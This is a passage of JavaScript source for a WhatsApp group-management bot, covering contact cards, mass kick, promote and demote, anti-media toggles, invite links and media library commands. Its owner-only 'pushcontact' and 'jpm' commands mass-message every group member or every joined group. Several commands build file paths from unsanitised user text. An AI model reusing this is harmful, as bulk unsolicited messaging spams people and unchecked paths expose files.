if (!m.isGroup) return XliconStickGroup()
if (!m.mentionedJid[0]) return replygcxlicon('\nUse like this\n Example:.sendcontact @tag name')
let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
XliconBotInc.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
}
break
case 'contacttag': case 'contag':{
if (!m.isGroup) return XliconStickGroup()
if (!(m.isAdmin || XliconTheCreator)) return XliconStickAdmin()
if (!m.mentionedJid[0]) return replygcxlicon('\nUse like this\n Example:.contacttag @tag|name')
let sngTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let sngContact = {
	displayName: "Contact", contacts: [{displayName: sngTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+sngTak+";;;\nFN:"+sngTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
XliconBotInc.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
}
break
			case 'kickall': {
 if (!m.isGroup) return XliconStickGroup()
 if (!m.isAdmin && !XliconTheCreator) return XliconStickAdmin()
 if (!m.isBotAdmin) return XliconStickBotAdmin()
  const xliconkickall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 if (global.db.groups[m.chat].welcome === true) {
 global.db.groups[m.chat].welcome = false;
  }
 for (let remove of xliconkickall) {
 await XliconBotInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove], "remove");
 await sleep(100);
 }
 replygcxlicon(`✅ Success`);

}
break



case 'promoteall': {
 if (!m.isGroup) return XliconStickGroup()
 if (!m.isAdmin && !XliconTheCreator) return XliconStickAdmin()
 if (!m.isBotAdmin) return XliconStickBotAdmin()
  const xliconpromoteall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 for (let promote of xliconpromoteall) {
 await XliconBotInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${promote}@s.whatsapp.net` : promote], "promote");
 await sleep(100);
 }
 replygcxlicon(`✅ Success`);

}
break



case 'demoteall': {
 if (!m.isGroup) return XliconStickGroup()
 if (!m.isAdmin && !XliconTheCreator) return XliconStickAdmin()
 if (!m.isBotAdmin) return XliconStickBotAdmin()
  const xlicondemoteall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 for (let demote of xlicondemoteall) {
 await XliconBotInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${demote}@s.whatsapp.net` : demote], "demote");
 await sleep(100);
 }
 replygcxlicon(`✅ Success`);

}
break



			case 'ephemeral': {
    if (!m.isGroup) return XliconStickGroup();
    if (!m.isBotAdmin) return await replygcxlicon('I need to be an admin to use this command.');
    if (!m.isAdmin) return await replygcxlicon('You need to be an admin to use this command.');

    if (args[0] === 'on') {
        await XliconBotInc.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL });
        await replygcxlicon('Ephemeral messages are now enabled.');
    } else if (args[0] === 'off') {
        await XliconBotInc.sendMessage(m.chat, { disappearingMessagesInChat: false });
        await replygcxlicon('Ephemeral messages are now disabled.');
    } else {
        await replygcxlicon(`Hi ${m.pushName},\nPlease use the command with 'on' or 'off'.\nExample: *${prefix + command} on* or *${prefix + command} off*`);
    }
}
break;

case 'invite': {
  if (!m.isGroup) return XliconStickGroup();
  if (!m.isBotAdmin) return XliconStickBotAdmin();

  if (!text) return replygcxlicon(`❗ Please provide the number you want to invite to the group.\n\nExample: *${prefix + command} 916909137213*`);
  if (text.includes('+')) return replygcxlicon(`⚠️ Please enter the number without the '+' sign.`);
  if (isNaN(text)) return replygcxlicon(`🚫 Please enter only the digits, along with your country code, without spaces.`);

  let group = m.chat;
  let link = 'https://chat.whatsapp.com/' + await XliconBotInc.groupInviteCode(group);

  try {
      await XliconBotInc.sendMessage(text + '@s.whatsapp.net', {
          text: `🌟 *GROUP INVITATION*\n\nYou have been invited to join the group. Click the link below to join:\n\n🔗 ${link}`,
          mentions: [m.sender]
      });
      replygcxlicon(`✅ An invite link has been successfully sent to the user.`);
  } catch (error) {
      console.error(error);
      replygcxlicon(`⚠️ Failed to send the invite. Please check the number and try again.`);
  }
}
break;

case 'tagadmin': case 'listadmin': case 'admin': {
  if (!m.isGroup) return XliconStickGroup();

  const groupAdmins = participants.filter(p => p.admin);
  const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n');
  const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net';

  let text = `👑 *Group Admins:*\n${listAdmin}\n\n📜 *Group Owner*: @${owner.split('@')[0]}`;

  // Send message with admin list
  await replygcxlicon(text);
}
break;


			case 'linkgroup':
case 'linkgrup':
case 'linkgc':
case 'gclink':
case 'grouplink':
case 'gruplink': {
    if (!m.isGroup) return XliconStickGroup(); // Check if it's a group
    if (!m.isBotAdmin) return XliconStickBotAdmin(); // Check if bot is admin

    let response = await XliconBotInc.groupInviteCode(m.chat); // Get group invite link

    // Custom message styling for better design
    const groupLinkMessage = `
\`\`\`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\`

\`\`\`🌐 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐆𝐑𝐎𝐔𝐏 𝐋𝐈𝐍𝐊 🌐\`\`\`

\`\`\`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\`

👥 *Group Link:* https://chat.whatsapp.com/${response}

🌱 *Group ID:* ${m.chat}

👥 *Total Members:* ${groupMetadata.participants.length}

\`\`\`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\`

\`\`\`🎯 Powered by 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇 🎯\`\`\`

\`\`\`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\`
`;

    // Send the message with the custom footer and channel button
    XliconBotInc.sendMessage(m.chat, {
        text: groupLinkMessage,
        footer: `\`\`\`❄️ POWERED BY 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇 ❄️\`\`\``,
        contextInfo: {
            externalAdReply: {
                title: "❄️𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐆𝐑𝐎𝐔𝐏 𝐋𝐈𝐍𝐊❄️", // Title for the bot picture and menu
                body: "Join our group for updates and support.",
                showAdAttribution: true,
                mediaType: 1,
                thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'), // Bot picture
                sourceUrl: global.wagc, // Clickable button for the channel
            },
        },
        quoted: m
    });
}
break;
        
			case 'antipoll': {
    if (!m.isGroup) return XliconStickGroup();
    if (!m.isBotAdmin) return XliconStickBotAdmin();
    if (!m.isAdmin && !XliconTheCreator) return XliconStickAdmin();

    if (args[0] === 'on') {
        db.groups[m.chat].antipoll = true;
        replygcxlicon(`${command} is enabled`);
    } else if (args[0] === 'off') {
        db.groups[m.chat].antipoll = false;
        replygcxlicon(`${command} is disabled`);
    } else {
        replygcxlicon(`Please use *${prefix + command} on* to enable and *${prefix + command} off* to disable.`);
    }
}
break;

case 'antiaudio': {
    if (!m.isGroup) return XliconAudioGroup();
    if (!m.isBotAdmin) return XliconAudioBotAdmin();
    if (!m.isAdmin && !XliconTheCreator) return XliconAudioAdmin();

    if (args[0] === 'on') {
        db.groups[m.chat].antiaudio = true;
        replygcxlicon(`${command} is enabled`);
    } else if (args[0] === 'off') {
        db.groups[m.chat].antiaudio = false;
        replygcxlicon(`${command} is disabled`);
    } else {
        replygcxlicon(`Please use *${prefix + command} on* to enable and *${prefix + command} off* to disable.`);
    }
}
break;
            case 'antisticker': {
    if (!m.isGroup) return XliconStickGroup();
    if (!m.isBotAdmin) return XliconStickBotAdmin();
    if (!m.isAdmin && !XliconTheCreator) return XliconStickAdmin();

    if (args[0] === 'on') {
        db.groups[m.chat].antisticker = true;
        replygcxlicon(`${command} is enabled`);
    } else if (args[0] === 'off') {
        db.groups[m.chat].antisticker = false;
        replygcxlicon(`${command} is disabled`);
    } else {
        replygcxlicon(`Please use *${prefix + command} on* to enable and *${prefix + command} off* to disable.`);
    }
}
break;

case 'antiemoji': {
    if (!m.isGroup) return XliconStickGroup();
    if (!m.isBotAdmin) return XliconStickBotAdmin();
    if (!m.isAdmin && !XliconTheCreator) return XliconStickAdmin();

    if (args[0] === 'on') {
        db.groups[m.chat].antiemoji = true;
        replygcxlicon(`${command} is enabled`);
    } else if (args[0] === 'off') {
        db.groups[m.chat].antiemoji = false;
        replygcxlicon(`${command} is disabled`);
    } else {
        replygcxlicon(`Please use *${prefix + command} on* to enable and *${prefix + command} off* to disable.`);
    }
}
break;

          


          
           case 'antiimage': {
    if (!m.isGroup) return XliconStickGroup();
    if (!m.isBotAdmin) return XliconStickBotAdmin();
    if (!m.isAdmin && !XliconTheCreator) return XliconStickAdmin();

    if (args[0] === 'on') {
        db.groups[m.chat].antiimage = true;
        replygcxlicon(`${command} is enabled`);
    } else if (args[0] === 'off') {
        db.groups[m.chat].antiimage = false;
        replygcxlicon(`${command} is disabled`);
    } else {
        replygcxlicon(`Please use *${prefix + command} on* to enable and *${prefix + command} off* to disable.`);
    }
}
break;

case 'antivideo': {
    if (!m.isGroup) return XliconStickGroup();
    if (!m.isBotAdmin) return XliconStickBotAdmin();
    if (!m.isAdmin && !XliconTheCreator) return XliconStickAdmin();

    if (args[0] === 'on') {
        db.groups[m.chat].antivideo = true;
        replygcxlicon(`${command} is enabled`);
    } else if (args[0] === 'off') {
        db.groups[m.chat].antivideo = false;
        replygcxlicon(`${command} is disabled`);
    } else {
        replygcxlicon(`Please use *${prefix + command} on* to enable and *${prefix + command} off* to disable.`);
    }
}
break;

case 'antivirtex': case 'antivirus': {
    if (!m.isGroup) return XliconStickGroup();
    if (!m.isBotAdmin) return XliconStickBotAdmin();
    if (!m.isAdmin && !XliconTheCreator) return XliconStickAdmin();

    if (args[0] === 'on') {
        db.groups[m.chat].antivirtex = true;
        replygcxlicon(`${command} is enabled`);
    } else if (args[0] === 'off') {
        db.groups[m.chat].antivirtex = false;
        replygcxlicon(`${command} is disabled`);
    } else {
        replygcxlicon(`Please use *${prefix + command} on* to enable and *${prefix + command} off* to disable.`);
    }
}
break;
            
			case 'unavailable': {
    if (!XliconTheCreator) return XliconStickOwner();

    if (q === 'on') {
        db.settings[botNumber].online = true;
        replygcxlicon(`Successfully changed unavailable to ${q}`);
    } else if (q === 'off') {
        db.settings[botNumber].online = false;
        replygcxlicon(`Successfully changed unavailable to ${q}`);
    } else {
        replygcxlicon(`Please use *${prefix + command} on* to enable and *${prefix + command} off* to disable.`);
    }
}
break;

case 'welcome':
case 'left': {
    if (!m.isGroup) return XliconStickGroup();
    if (!m.isAdmin && !XliconTheCreator) return XliconStickAdmin();

    if (args[0] === 'on') {
        db.groups[m.chat].welcome = true;
        replygcxlicon(`${command} is enabled`);
    } else if (args[0] === 'off') {
        db.groups[m.chat].welcome = false;
        replygcxlicon(`${command} is disabled`);
    } else {
        replygcxlicon(`Please use *${prefix + command} on* to enable and *${prefix + command} off* to disable.`);
    }
}
break;

          
case 'groupevent': {
    if (!m.isGroup) return XliconStickGroup();
    if (!m.isAdmin && !XliconTheCreator) return XliconStickAdmin();

    if (args[0] === 'on') {
        db.groups[m.chat].setinfo = true;
        replygcxlicon(`${command} is enabled`);
    } else if (args[0] === 'off') {
        db.groups[m.chat].setinfo = false;
        replygcxlicon(`${command} is disabled`);
    } else {
        replygcxlicon(`Please use *${prefix + command} on* to enable and *${prefix + command} off* to disable.`);
    }
}
break;

case 'antiviewonce': {
    if (!m.isGroup) return XliconStickGroup();
    if (!m.isBotAdmin) return XliconStickBotAdmin();
    if (!m.isAdmin && !XliconTheCreator) return XliconStickAdmin();

    if (args[0] === 'on') {
        db.groups[m.chat].antiviewonce = true;
        replygcxlicon(`${command} is enabled`);
    } else if (args[0] === 'off') {
        db.groups[m.chat].antiviewonce = false;
        replygcxlicon(`${command} is disabled`);
    } else {
        replygcxlicon(`Please use *${prefix + command} on* to enable and *${prefix + command} off* to disable.`);
    }
}
break;

case 'antimedia': {
    if (!m.isGroup) return XliconStickGroup();
    if (!m.isBotAdmin) return XliconStickBotAdmin();
    if (!m.isAdmin && !XliconTheCreator) return XliconStickAdmin();

    if (args[0] === 'on') {
        db.groups[m.chat].antimedia = true;
        replygcxlicon(`${command} is enabled`);
    } else if (args[0] === 'off') {
        db.groups[m.chat].antimedia = false;
        replygcxlicon(`${command} is disabled`);
    } else {
        replygcxlicon(`Please use *${prefix + command} on* to enable and *${prefix + command} off* to disable.`);
    }
}
break;
           
            case 'antidocument': {
  if (!m.isGroup) return XliconStickGroup();
  if (!m.isBotAdmin) return XliconStickBotAdmin();
  if (!m.isAdmin && !XliconTheCreator) return XliconStickAdmin();

  if (args[0] === 'on') {
    db.groups[m.chat].antidocument = true;
    return replygcxlicon(`${command} is enabled ✅`);
  } else if (args[0] === 'off') {
    db.groups[m.chat].antidocument = false;
    return replygcxlicon(`${command} is disabled ❌`);
  } else {
    return replygcxlicon(`Please specify 'on' or 'off' to ${command}.`);
  }
  break;
}

case 'anticontact': {
  if (!m.isGroup) return XliconStickGroup();
  if (!m.isBotAdmin) return XliconStickBotAdmin();
  if (!m.isAdmin && !XliconTheCreator) return XliconStickAdmin();

  if (args[0] === 'on') {
    db.groups[m.chat].anticontact = true;
    return replygcxlicon(`${command} is enabled ✅`);
  } else if (args[0] === 'off') {
    db.groups[m.chat].anticontact = false;
    return replygcxlicon(`${command} is disabled ❌`);
  } else {
    return replygcxlicon(`Please specify 'on' or 'off' to ${command}.`);
  }
  break;
}

            
            case 'antilocation': {
  if (!m.isGroup) return XliconStickGroup();
  if (!m.isBotAdmin) return XliconStickBotAdmin();
  if (!m.isAdmin && !XliconTheCreator) return XliconStickAdmin();

  if (args[0] === 'on') {
    db.groups[m.chat].antilocation = true;
    return replygcxlicon(`${command} is enabled ✅`);
  } else if (args[0] === 'off') {
    db.groups[m.chat].antilocation = false;
    return replygcxlicon(`${command} is disabled ❌`);
  } else {
    return replygcxlicon(`Please specify 'on' or 'off' to ${command}.`);
  }
  break;
}

case 'antilink': {
  if (!m.isGroup) return XliconStickGroup();
  if (!m.isBotAdmin) return XliconStickBotAdmin();
  if (!m.isAdmin && !XliconTheCreator) return XliconStickAdmin();

  if (args[0] === 'on') {
    db.groups[m.chat].antilink = true;
    return replygcxlicon(`${command} is enabled ✅`);
  } else if (args[0] === 'off') {
    db.groups[m.chat].antilink = false;
    return replygcxlicon(`${command} is disabled ❌`);
  } else {
    return replygcxlicon(`Please specify 'on' or 'off' to ${command}.`);
  }
}
  break;

case 'antibot': {
  if (!m.isGroup) return XliconStickGroup();
  if (!m.isBotAdmin) return XliconStickBotAdmin();
  if (!m.isAdmin && !XliconTheCreator) return XliconStickAdmin();

  if (args[0] === 'on') {
    db.groups[m.chat].antibot = true;
    return replygcxlicon(`${command} is enabled ✅`);
  } else if (args[0] === 'off') {
    db.groups[m.chat].antibot = false;
    return replygcxlicon(`${command} is disabled ❌`);
  } else {
    return replygcxlicon(`Please specify 'on' or 'off' to ${command}.`);
  }
  break;
}

            
			case 'pinchat': {
if (!XliconTheCreator) return XliconStickOwner()
if (m.isGroup) return XliconStickPrivate()
XliconBotInc.chatModify({ pin: true }, m.chat)
}
break
case 'unpinchat': {
if (!XliconTheCreator) return XliconStickOwner()
if (m.isGroup) return XliconStickPrivate()
XliconBotInc.chatModify({ pin: false }, m.chat)
}
break
			case 'clearchat': {
if (!XliconTheCreator) return XliconStickOwner()
XliconBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break




			case 'checkmember': case 'cekmember':{
                                if (!m.isAdmin && !XliconTheCreator) return XliconStickAdmin()
                                if (!m.isGroup) return XliconStickGroup()
replygcxlicon(`Group: *${groupMetadata.subject}*\nTotal participants: *${participants.length}*`)
                                }
                                break




			case 'jpm': case 'post': case 'pushcontactgc': {
if (!XliconTheCreator) return XliconStickOwner()
if (!m.isGroup) return XliconStickGroup()
if (!text) return replygcxlicon(`*Incorrect Usage Please Use Like This*\n${prefix+command} text|pause\n\nReply Image To Send Images to All Groups\nFor a pause, 1000 = 1 second\n\nExample: ${prefix + command} hello|9000`)
await replygcxlicon(`In progress...`)
let getGroups = await XliconBotInc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await XliconBotInc.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await XliconBotInc.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await XliconBotInc.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await XliconBotInc.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
replygcxlicon(`✅ Success!`);

}
break
			case 'pushcontact': {
    if (!XliconTheCreator) return XliconStickOwner()
    if (!m.isGroup) return XliconStickGroup()
    if (!text) return replygcxlicon(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replygcxlicon(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    XliconBotInc.sendMessage(pler, { text: q})
     }  
     replygcxlicon(`✔️ Done!`);

      }
      break
case 'pushcontactv2':{
if (!XliconTheCreator) return XliconStickOwner()
if (!q) return replygcxlicon(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
try {
const metadata2 = await XliconBotInc.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
XliconBotInc.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
replygcxlicon(`✅ Success!`);

} catch {
	replygcxlicon(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
	}
}
break
case 'pushcontactv3': {
if (!XliconTheCreator) return XliconStickOwner()
if (!m.isGroup) return XliconStickGroup()
if (!text) return replygcxlicon(
`
*Usage example :*

${prefix+command} pause|text

‼️Reply Image To Send Images to All Participants, For a pause, 1000 = 1 second
`
)
try {
let jedany = text.split("|")[0]
let captny = text.split("|")[1]
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (/image/.test(mime)) {
media = await XliconBotInc.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await XliconBotInc.sendMessage(men, { image: { url: mem }, caption: captny }, { quoted: m })
await sleep(jedany)
} else {
await XliconBotInc.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
}
}
replygcxlicon(`✅ Success!`);

} catch {
	replygcxlicon(
`
*Usage example :*

${prefix+command} pause|text

‼️Reply Image To Send Images to All Participants, For a pause, 1000 = 1 second
`
)
}
}
break
			case 'autosticker': case 'autostickergc': {
  if (!XliconTheCreator) return XliconStickOwner();

  if (q === 'on') {
    db.settings[botNumber].autosticker = true;
    return replygcxlicon(`Auto Sticker has been successfully enabled ✅`);
  } else if (q === 'off') {
    db.settings[botNumber].autosticker = false;
    return replygcxlicon(`Auto Sticker has been successfully disabled ❌`);
  } else {
    return replygcxlicon(`Please specify 'on' or 'off' to change the Auto Sticker setting.`);
  }
  break;
}

case 'addvideo': {
  if (!XliconTheCreator) return XliconStickOwner();
  if (args.length < 1) return replygcxlicon('🎥 Please provide the video name.');
  if (VideoXlicon.includes(q)) return replygcxlicon("❌ The name is already in use.");

  let delb = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
  VideoXlicon.push(q);
  await fsx.copy(delb, `./ES_TEAMS-MEDIA/video/${q}.mp4`);
  fs.writeFileSync('./ES_TEAMS-MEDIA/database/xliconvideo.json', JSON.stringify(VideoXlicon));
  fs.unlinkSync(delb);

  replygcxlicon(`✅ Success adding video\nCheck by typing ${prefix}listvideo`);
}
break;

case 'delvideo': {
  if (!XliconTheCreator) return XliconStickOwner();
  if (args.length < 1) return replygcxlicon('❌ Enter the video name.');
  if (!VideoXlicon.includes(q)) return replygcxlicon("❌ The name does not exist in the database.");

  let wanu = VideoXlicon.indexOf(q);
  VideoXlicon.splice(wanu, 1);
  fs.writeFileSync('./ES_TEAMS-MEDIA/database/xliconvideo.json', JSON.stringify(VideoXlicon));
  fs.unlinkSync(`./ES_TEAMS-MEDIA/video/${q}.mp4`);

  replygcxlicon(`✅ Success deleting video: ${q}`);
}
break;

case 'listvideo': {
  let teks = '🎬┌──⭓「 *Video List* 」\n│\n';
  for (let x of VideoXlicon) {
      teks += `│📹 ${x}\n`;
  }
  teks += `│\n└────────────⭓\n\n*Total: ${VideoXlicon.length} videos*`;
  replygcxlicon(teks);
}
break;

case 'addimage': {
  if (!XliconTheCreator) return XliconStickOwner();
  if (args.length < 1) return replygcxlicon('🖼️ Please provide the image name.');
  if (ImageXlicon.includes(q)) return replygcxlicon("❌ The name is already in use.");

  let delb = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
  ImageXlicon.push(q);
  await fsx.copy(delb, `./ES_TEAMS-MEDIA/image/${q}.jpg`);
  fs.writeFileSync('./ES_TEAMS-MEDIA/database/xliconimage.json', JSON.stringify(ImageXlicon));
  fs.unlinkSync(delb);

  replygcxlicon(`✅ Success adding image\nCheck by typing ${prefix}listimage`);
}
break;

case 'delimage': {
  if (!XliconTheCreator) return XliconStickOwner();
  if (args.length < 1) return replygcxlicon('❌ Enter the image name.');
  if (!ImageXlicon.includes(q)) return replygcxlicon("❌ The name does not exist in the database.");

  let wanu = ImageXlicon.indexOf(q);
  ImageXlicon.splice(wanu, 1);
  fs.writeFileSync('./ES_TEAMS-MEDIA/database/xliconimage.json', JSON.stringify(ImageXlicon));
  fs.unlinkSync(`./ES_TEAMS-MEDIA/image/${q}.jpg`);

  replygcxlicon(`✅ Success deleting image: ${q}`);
}
break;

case 'listimage': {
  let teks = '🖼️┌──⭓「 *Image List* 」\n│\n';
  for (let x of ImageXlicon) {
      teks += `│🖼️ ${x}\n`;
  }
  teks += `│\n└────────────⭓\n\n*Totally there are: ${ImageXlicon.length}*`;
  replygcxlicon(teks);
}
break;

case 'addsticker': {
  if (!XliconTheCreator) return XliconStickOwner();
  if (args.length < 1) return replygcxlicon('💬 What’s the sticker name?');
  if (StickerXlicon.includes(q)) return replygcxlicon("❌ The name is already in use");
  let delb = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
  StickerXlicon.push(q);
  await fsx.copy(delb, `./ES_TEAMS-MEDIA/sticker/${q}.webp`);
  fs.writeFileSync('./ES_TEAMS-MEDIA/database/xliconsticker.json', JSON.stringify(StickerXlicon));
  fs.unlinkSync(delb);
  replygcxlicon(`✅ Success Adding Sticker\nCheck by typing ${prefix}liststicker`);
}
break;

case 'delsticker': {
  if (!XliconTheCreator) return XliconStickOwner();
  if (args.length < 1) return replygcxlicon('❌ Enter the sticker name');
  if (!StickerXlicon.includes(q)) return replygcxlicon("❌ The name does not exist in the database");
  let wanu = StickerXlicon.indexOf(q);
  StickerXlicon.splice(wanu, 1);
  fs.writeFileSync('./ES_TEAMS-MEDIA/database/xliconsticker.json', JSON.stringify(StickerXlicon));
  fs.unlinkSync(`./ES_TEAMS-MEDIA/sticker/${q}.webp`);
  replygcxlicon(`✅ Success deleting sticker ${q}`);
}
break;

case 'liststicker': {
  let teks = '💬┌──⭓「 *Sticker List* 」\n│\n';
  for (let x of StickerXlicon) {
      teks += `│💥 ${x}\n`;
  }
  teks += `│\n└────────────⭓\n\n*Totally there are: ${StickerXlicon.length}*`;
  replygcxlicon(teks);
}
break;

case 'addvn': {
  if (!XliconTheCreator) return XliconStickOwner();
  if (args.length < 1) return replygcxlicon('🎵 What’s the audio name?');
  if (VoiceNoteXlicon.includes(q)) return replygcxlicon("❌ The name is already in use");
  let delb = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
  VoiceNoteXlicon.push(q);
  await fsx.copy(delb, `./ES_TEAMS-MEDIA/audio/${q}.mp3`);
  fs.writeFileSync('./ES_TEAMS-MEDIA/database/xliconvn.json', JSON.stringify(VoiceNoteXlicon));
  fs.unlinkSync(delb);
  replygcxlicon(`✅ Success Adding Audio\nCheck by typing ${prefix}listvn`);
}
break;

case 'delvn': {
  if (!XliconTheCreator) return XliconStickOwner();
  if (args.length < 1) return replygcxlicon('❌ Enter the vn name');
  if (!VoiceNoteXlicon.includes(q)) return replygcxlicon("❌ The name does not exist in the database");
  let wanu = VoiceNoteXlicon.indexOf(q);
  VoiceNoteXlicon.splice(wanu, 1);
  fs.writeFileSync('./ES_TEAMS-MEDIA/database/xliconvn.json', JSON.stringify(VoiceNoteXlicon));
  fs.unlinkSync(`./ES_TEAMS-MEDIA/audio/${q}.mp3`);
  replygcxlicon(`✅ Success deleting vn ${q}`);
}
break;

case 'listvn': {
  let teks = '🎵┌──⭓「 *VN List* 」\n│\n';
  for (let x of VoiceNoteXlicon) {
      teks += `│🎶 ${x}\n`;
  }
  teks += `│\n└────────────⭓\n\n*Totally there are: ${VoiceNoteXlicon.length}*`;
  replygcxlicon(teks);
}
break;

case 'addzip': {
  if (!XliconTheCreator) return XliconStickOwner();
  if (args.length < 1) return replygcxlicon('📦 What’s the zip name?');
  let teks = `${text}`;
  {
      if (ZipXlicon.includes(teks)) return replygcxlicon("❌ This name is already in use");
      let delb = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
      ZipXlicon.push(teks);
      await fsx.copy(delb, `./ES_TEAMS-MEDIA/zip/${teks}.zip`);
      fs.writeFileSync('./ES_TEAMS-MEDIA/database/zip.json', JSON.stringify(ZipXlicon));
      fs.unlinkSync(delb);
      replygcxlicon(`✅ Success Adding Zip\nTo check type ${prefix}listzip`);
  }
}
break;

case 'delzip': {
  if (!XliconTheCreator) return XliconStickOwner();
  if (args.length < 1) return replygcxlicon('❌ Enter the text in the zip list');
  let teks = `${text}`;
  {
      if (!ZipXlicon.includes(teks)) return replygcxlicon("❌ This name does not exist in the database");
      let wanu = ZipXlicon.indexOf(teks);
      ZipXlicon.splice(wanu, 1);
      fs.writeFileSync('./ES_TEAMS-MEDIA/database/zip.json', JSON.stringify(ZipXlicon));
      fs.unlinkSync(`./ES_TEAMS-MEDIA/zip/${teks}.zip`);
      replygcxlicon(`✅ Successfully deleted zip ${teks}`);
  }
}
break;

case 'listzip': {
  let teksooooo = '📦┌──⭓「 *ZIP LIST* 」\n│\n';
  for (let x of ZipXlicon) {
      teksooooo += `│🗂️ ${x}\n`;
  }
  teksooooo += `│\n└────────────⭓\n\n*Total: ${ZipXlicon.length}*`;
  replygcxlicon(teksooooo);
}
break;


case 'addapk': {
  if (!XliconTheCreator) return XliconStickOwner();

  if (args.length < 1) return replygcxlicon('📱 What is the name of the apk?');
  let teks = `${text}`;
  {
      if (ApkXlicon.includes(teks)) return replygcxlicon("❌ This name is already in use");
      let delb = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
      ApkXlicon.push(teks);
      await fsx.copy(delb, `./ES_TEAMS-MEDIA/apk/${teks}.apk`);
      fs.writeFileSync('./ES_TEAMS-MEDIA/database/apk.json', JSON.stringify(ApkXlicon));
      fs.unlinkSync(delb);
      replygcxlicon(`✅ Successfully added apk\nTo Check type ${prefix}listapk`);
  }
}
break;

case 'delapk': {
  if (!XliconTheCreator) return XliconStickOwner();

  if (args.length < 1) return replygcxlicon('❌ Enter the name of the apk to delete');
  let teks = `${text}`;
  {
      if (!ApkXlicon.includes(teks)) return replygcxlicon("❌ This name does not exist in the database");
      let wanu = ApkXlicon.indexOf(teks);
      ApkXlicon.splice(wanu, 1);
      fs.writeFileSync('./ES_TEAMS-MEDIA/database/apk.json', JSON.stringify(ApkXlicon));
      fs.unlinkSync(`./ES_TEAMS-MEDIA/apk/${teks}.apk`);
      replygcxlicon(`✅ Successfully deleted Apk: ${teks}`);
  }
}
break;

case 'listapk': {
  let teksoooooo = '📱┌──⭓「 *APK LIST* 」\n│\n';
  for (let x of ApkXlicon) {
      teksoooooo += `│📦 ${x}\n`;
  }
